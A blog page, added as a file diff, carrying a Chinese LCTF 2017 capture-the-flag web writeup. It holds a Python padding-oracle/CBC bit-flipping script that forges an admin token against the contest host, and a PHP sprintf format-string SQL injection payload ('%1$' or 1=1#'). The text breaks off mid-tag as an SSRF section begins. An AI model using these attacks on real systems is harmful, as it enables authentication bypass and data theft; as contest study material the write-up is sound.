@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      LCTF 2017 Web writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。 Simple blog A simple blog .To discover the secret of it.http://111.231.111.54/  打开后是一个简洁的博客系统，主页面没有什么功能，扫一下发现有 .login.php.swp 和 .admin.php.swp login.php123">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LCTF 2017 Web writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/11/21/LCTF-2017-Web-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。 Simple blog A simple blog .To discover the secret of it.http://111.231.111.54/  打开后是一个简洁的博客系统，主页面没有什么功能，扫一下发现有 .login.php.swp 和 .admin.php.swp login.php123">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171120145400_ryBV9G_1.jpeg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171120145654_0umAeT_2.jpeg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171121213832_PaZOec_5.jpeg">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171121121954_ubrcLg_3.jpeg">
+<meta property="og:updated_time" content="2017-11-21T13:44:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LCTF 2017 Web writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。 Simple blog A simple blog .To discover the secret of it.http://111.231.111.54/  打开后是一个简洁的博客系统，主页面没有什么功能，扫一下发现有 .login.php.swp 和 .admin.php.swp login.php123">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171120145400_ryBV9G_1.jpeg">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">LCTF 2017 Web writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-11-21" class="post-meta__date date">2017-11-21</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>这次趁着周末有些时间，做了西电师傅们的 LCTF，整场下来感觉质量可以，没有太大的脑洞。</p>
+<h3 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h3><blockquote>
+<p>A simple blog .To discover the secret of it.<br><a href="http://111.231.111.54/" target="_blank" rel="external">http://111.231.111.54/</a></p>
+</blockquote>
+<p>打开后是一个简洁的博客系统，主页面没有什么功能，扫一下发现有 .login.php.swp 和 .admin.php.swp</p>
+<h4 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="login"&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;后台登录&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token = <span class="string">''</span>;</span><br><span class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $id;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	$username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	$result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</span><br><span class="line">  		get_identity();</span><br><span class="line">  		header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		<span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(test_identity())&#123;</span><br><span class="line">        header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_page();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	$id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">		$title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</span><br><span class="line">		$title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$title = <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line">	$result = mysql_query($sql,$con);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;adminpage&lt;/title&gt;</span><br><span class="line">	&lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;nav class="navbar navbar-default" role="navigation"&gt;</span><br><span class="line">   &lt;div class="navbar-header"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="#"&gt;后台&lt;/a&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div&gt;</span><br><span class="line">      &lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;编辑文章&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;设置&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">   &lt;/div&gt;&lt;/nav&gt;</span><br><span class="line">   &lt;div class="panel panel-success"&gt;</span><br><span class="line">   &lt;div class="panel-heading"&gt;</span><br><span class="line">      &lt;h1 class="panel-title"&gt;文章列表&lt;/h1&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div class="panel-body"&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>之前碰到过很多次 cbc 相关的的攻击了，先 padding oracle attack 得到中间值，再字节反转得到自己想要的值，比如这里是 <code>admin</code>，原理不再叙说，有兴趣的看下这两篇文章，分析的都不错<br><a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="external">我对Padding Oracle攻击的分析和思考（详细）</a><br><a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" target="_blank" rel="external">Padding Oracle Attack实例分析</a></p>
+<p>因为这里我构造的是一个分组长度的密文，所以第一个字节直接登录爆破(登录成功即构造想要的明文成功)<br>ps: 第一个字节的值也可以通过构造两个分组长度的密文，第二个分组全是 0x10 的形式，利用和得到其他字节一样的 padding error 来得到</p>
+<p>脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://111.231.111.54/login.php'</span></span><br><span class="line">iv = list(<span class="string">'0000000000000000'</span>)</span><br><span class="line">mid = [<span class="string">'0'</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到第一个分组密文的中间值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMiddleValue</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        iv_fix = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i<span class="number">-1</span>)[::<span class="number">-1</span>]:</span><br><span class="line">            iv_fix += chr(ord(mid[<span class="number">16</span>-j<span class="number">-1</span>]) ^ i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            iv = <span class="string">'0'</span> * (<span class="number">16</span>-i) + chr(j) + iv_fix</span><br><span class="line">            cookies = dict(PHPSESSID=<span class="string">'5vr0tum53p0kfpth39dqirh900'</span>, token=iv.encode(<span class="string">"base64"</span>).replace(<span class="string">'='</span>, <span class="string">'%3D'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">            r = requests.get(url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Error!'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">print</span> iv</span><br><span class="line">                mid[<span class="number">16</span>-i] = chr(i ^ j)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">''</span>.join(mid).encode(<span class="string">'hex'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 303373782b0e140603135c1407091b66 (hex middle value)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录爆破第一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span>    </span><br><span class="line">    mid = list(<span class="string">'303373782b0e140603135c1407091b66'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">    iv = [<span class="string">'0'</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, <span class="number">16</span>):</span><br><span class="line">            iv[i] = chr(<span class="number">0x0b</span> ^ ord(mid[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        iv[i] = chr(ord(<span class="string">'dmin'</span>[i<span class="number">-1</span>]) ^ ord(mid[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        iv[<span class="number">0</span>] = chr(i)</span><br><span class="line">        cookies = dict(PHPSESSID=<span class="string">'5vr0tum53p0kfpth39dqirh900'</span>, token=<span class="string">''</span>.join(iv).encode(<span class="string">"base64"</span>).replace(<span class="string">'='</span>, <span class="string">'%3D'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        r = requests.get(url, cookies=cookies, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">print</span> cookies</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    login()</span><br></pre></td></tr></table></figure></p>
+<p>ps2: PHPSESSID 值是 admin 账户弱口令 admin 登录拿到的，否则就会导致无法进入 get_identity 函数，变量 <code>$_SESSION[&#39;id&#39;]</code> 值为空，进入不了解密部分，也就无法实现 cbc 攻击</p>
+<p>利用得到的 token 进入 admin.php，看下源码，很明显是 php sprintf 的格式化字符串漏洞，随便找一篇文章分析下<br><a href="https://paper.seebug.org/386/" target="_blank" rel="external">从WordPress SQLi谈PHP格式化字符串问题（2017.11.01更新）</a></p>
+<p>php 的 sprintf 有下面这种写法<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171120145400_ryBV9G_1.jpeg" alt=""></p>
+<p>% 后面的数字表示第几个参数，$ 后面的字符表示数据的类型，我们看下 php 源码中对于 $ 后面数据类型的处理<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/LCTF/20171120145654_0umAeT_2.jpeg" alt=""><br>如果匹配不到上面的类型，默认是 break，不做任何处理，所以如果构造 <code>%1$&#39;</code>，单引号经过转义后成为 <code>%1$\&#39;</code>，然后再经过 sprintf 时 <code>\</code> 被当做数据类型符，因为它不在已知的类型符里，所以跳到了 default，不作任何处理，单引号成功逃逸。</p>
+<p>也可以采用 <code>%&#39;</code> 的形式绕过，因为转义后是 <code>%\&#39;</code>，而 <code>%\</code> 是一个不存在的类型，但是 php 不会报错，而是输出为空，不过这样容易遇到 <code>Warning: sprintf(): Too few arguments</code> 的报错，因为虽然这样写进去了但是后面缺少参数，而上面提到的方式直接输出为空了。</p>
+<p>本地试一下，源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">    $title = addslashes($_GET[<span class="string">'title'</span>]);</span><br><span class="line">    $title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $title = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>问题在于 title 参数在转义后输出到了 sprintf 第一个参数 <code>string $format</code> 中，如果有 <code>%</code> 就会被当做格式，从而导致了上面的问题。</p>
+<p>输入 <code>id=1&amp;title=%1$&#39; or 1=1%23</code>，<code>$title</code> 的值是 <code>AND title=&#39;%1$\&#39; or 1=1#&#39;</code>，没有什么问题，之后再次进入 sprintf，第一个参数的值是 <code>SELECT * FROM article WHERE id=&#39;%s&#39; AND title=&#39;%1$\&#39; or 1=1#&#39;</code>，其中 <code>%1$\</code> 就会发生上面所分析的问题，最终输出 <code>SELECT * FROM article WHERE id=&#39;1&#39; AND title=&#39;&#39; or 1=1#&#39;</code>。</p>
+<p>然后就可以愉快的注入出 flag 了<br>ps3: 比较坑的是 flag 所在的表名是 key，因为 key 在 mysql 中是关键字，所以不能直接 <code>select f14g from key</code>，可以 <code>select f14g from 数据库名.key</code> 或者 <figure class="highlight plain"><figcaption><span>f14g from `key` ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 签到题</span><br><span class="line">出题人题目名字随便起系列...</span><br><span class="line"></span><br><span class="line">可以提交 url，然后会返回请求到的内容，尝试了很多次发现只能请求 www.baidu.com，然后马上就想到了 orange 之前演讲的 ppt</span><br><span class="line"></span><br><span class="line">[A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)</span><br><span 